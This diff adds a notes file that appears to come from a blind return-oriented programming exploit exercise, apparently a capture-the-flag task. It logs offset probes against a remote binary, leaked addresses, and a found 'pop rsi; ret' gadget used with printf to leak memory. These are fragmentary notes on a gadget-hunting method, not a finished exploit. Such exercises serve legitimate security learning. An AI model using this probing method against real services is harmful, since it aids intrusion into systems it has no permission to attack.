@@ -1,0 +1,45 @@
+
+0400cad
+
+
+.0x0 ('TIMEOUT', '\n0000000000400cad\nData size: ')
+.0x1 ('TIMEOUT', '\n0000000000400cad\nData size: ')
+.0x2 ('TIMEOUT', '\n0000000000400cad\nData size: ')
+..0x4 ('TIMEOUT', '\n0000000000400cad\nData size: ')
+.0x5 ('TIMEOUT', '\n0000000000400cad\nData size: ')
+.0x6 ('TIMEOUT', '\n0000000000000021\nData size: ')
+.....0xb ('TIMEOUT', '\n000000000000002c\nData size: ')
+.0xc ('TIMEOUT', '\n000000000000002c\nData size: ')
+..0xe ('TIMEOUT', '\n00000000006ee3c3\nData size: ')
+.0xf ('TIMEOUT', '\n00000000006ee3c3\nData size: ')
+...0xcbb ('TIMEOUT', '\n00000000006ee3c3\nData size: ')
+...0xcae ('TIMEOUT', '\n0000000000400cad\nData size: ')
+..0xcbc ('TIMEOUT', '\n00000000006ee3c3\nData size: ')
+...0xcb2 ('TIMEOUT', '\n0000000000400cad\nData size: ')
+
+mov rsi, 0x400cad
+
+dq(scan_value) <--- pop rsi; ret
+dq(0x4141414141414141)
+
+
+
+400cbc: lea rdi, "%16x\n..."  (7 bytes or 8 bytes)
+call printf
+
+CRASH --- try harder
+PRINT different --- try harder    pop rXX; ret
+PRINT 4141414141414141 -- pop rsi; ret
+
+
+400cbc 00000000006ee3c3
+
+
+
+0x38e2 pop rsi; ret
+
+ ('TIMEOUT', '\n4141414141414141\nData size: ')
+.......0x38f3 ('TIMEOUT', '\n00000000006ee3c3\nData size: ')
+..0x38f4 ('TIMEOUT', '\n4141414141414141\nData size: ')
+
+
